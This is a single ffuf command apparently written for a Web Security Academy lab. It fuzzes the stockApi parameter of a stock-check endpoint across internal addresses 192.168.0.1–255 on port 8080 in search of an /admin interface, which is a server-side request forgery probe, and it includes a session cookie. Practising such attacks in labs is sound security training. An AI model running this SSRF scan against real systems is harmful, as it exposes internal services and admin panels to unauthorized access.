ffuf -u 'https://0ad1009304d8dc7c823ccade009a00bd.web-security-academy.net/product/stock' \
  -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: session=HAMjJPJUpMTP8Sfzhpuo1OI1egt2xZ9p' \
  -d 'stockApi=http://192.168.0.FUZZ:8080/admin' \
  -w <(seq 1 255) \
  -mc 200
